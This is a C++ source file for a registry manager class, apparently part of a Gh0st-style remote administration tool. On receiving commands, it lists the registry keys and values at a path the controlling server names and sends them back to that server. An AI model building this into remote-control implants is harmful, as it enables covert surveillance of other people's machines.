// RegisterManager.cpp: implementation of the CRegisterManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "RegisterManager.h"
#include "Common.h"
#include <IOSTREAM>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CRegisterManager::CRegisterManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
{
	BYTE bToken=TOKEN_REGEDIT;
	m_ClientObject->Send2Server((char*)&bToken, 1);
}

CRegisterManager::~CRegisterManager()
{
	Mprintf("CRegisterManager 析构\n");
}

VOID  CRegisterManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
	case COMMAND_REG_FIND:             //查数据
        if(ulLength>3){
			Find(szBuffer[1],(char*)(szBuffer+2));
		}else{
			Find(szBuffer[1],NULL);   //Root数据
		}
		break;
	default:
		break;
	}
}

VOID CRegisterManager::Find(char bToken, char *szPath)
{
	RegisterOperation  Opt(bToken);   
	if(szPath!=NULL)
	{
       Opt.SetPath(szPath);
	}
	char *szBuffer= Opt.FindPath();
	if(szBuffer!=NULL)
	{
		m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
		//目录下的目录
		LocalFree(szBuffer);
	}
	szBuffer = Opt.FindKey();	
    if(szBuffer!=NULL)
	{
		//目录下的文件
		m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
		LocalFree(szBuffer);
	}
}
